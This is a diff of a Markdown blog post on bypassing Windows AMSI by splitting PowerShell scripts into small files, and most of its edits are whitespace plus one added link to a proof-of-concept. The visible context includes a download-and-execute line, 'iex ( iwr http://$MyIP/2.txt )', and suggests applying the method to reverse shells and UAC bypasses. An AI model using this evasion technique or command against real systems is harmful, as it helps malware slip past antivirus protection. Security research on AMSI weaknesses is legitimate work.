@@ -15,11 +15,10 @@ This post is about a new simple way to bypass AMSI (Antimalware Scan Interface),
 
 ## Introduction
 
-In the last few years, Powershell become so popular and a great target for hackers, as it provide access to almost all windows's components, due to its integration with .NET framework, which allows us, Offensive security guys to perform differents attacks without even touching the disk, and that make AV jobs more difficut! 
+In the last few years, Powershell become so popular and a great target for hackers, as it provide access to almost all windows's components, due to its integration with .NET framework, which allows us, Offensive security guys to perform differents attacks without even touching the disk, and that make AV jobs more difficut!
 Because of that, Microsoft introduced AMSI in 2015 as a defence Layer against this type of attacks, you can read all about it [here](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal).
 
 A defense mechanism for the offensive side, means that it need a bypass, and that's what happened, new bypasses are discovered, Matt Graeber's Reflection method, Patching amsi.dll AmsiScanBuffer by rasta-mouse etc ...
-
 
 ## Problem?
 
@@ -69,7 +68,6 @@ By executing `./main.ps1` We see the processes list, which means that the variab
 
 > `Add-Type` cmdlet adds a Microsoft .NET class to a PowerShell session. It's used by Some AMSI Bypass which we'll see later ..
 {: .prompt-info }
-
 
 I took this example from [*Microsoft*](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2):
 
@@ -133,6 +131,7 @@ iex ( iwr http://$MyIP/2.txt -UseBasicParsing );
 ```
 
 And it worked again, without problems:
+
 ```powershell
 PS C:\Users\x4sh3s\OneDrive\Desktop> .\main.ps1
 This Line Is Mine
@@ -234,6 +233,7 @@ It Successfully Bypass AMSI, without changing a letter in the code! Niice..
 > In case it's detected, breaking the script into more files (Line/file) will do the job, unless Microsoft finds a way to deny this method. Until then, Enjoy ^^
 {: .prompt-warning }
 
+You can found a PoC of all of that [here](https://github.com/x4sh3s/AMSI_Lines)
 
 ## Conclusion
 
@@ -241,7 +241,7 @@ We reached the end of the post,
 
 As a review, we saw how to bypass AMSI by dividing a script into small files. I think the most useful use-case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn't testing on a script that contains defined functions, but the principle stay the same.
 
-i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated .. 
+i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated ..
 
 ## Links & Resources
 
